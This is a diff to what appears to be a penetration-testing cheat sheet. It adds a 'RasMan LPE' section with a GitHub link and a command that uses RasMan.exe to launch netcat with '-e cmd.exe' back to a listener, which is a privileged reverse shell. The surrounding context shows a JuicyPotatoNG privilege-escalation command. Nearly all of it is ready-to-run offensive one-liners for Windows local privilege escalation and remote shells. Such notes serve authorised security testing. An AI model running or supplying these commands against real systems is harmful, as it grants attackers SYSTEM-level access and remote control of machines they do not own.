@@ -11446,6 +11446,15 @@ $RESULT | ogv
 .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
 ```
 
+#### RasMan LPE
+
+https://github.com/crisprss/RasmanPotato
+
+```c
+cmd.exe /c "c:\windows\temp\RasMan.exe -i -m 1 -c c:\windows\temp\nc.exe LOCAL_IP LOCAL_PORT -e cmd.exe"
+
+```
+
 Take Invoke-PowerShellTcpOneLine.ps1
 
 ```c
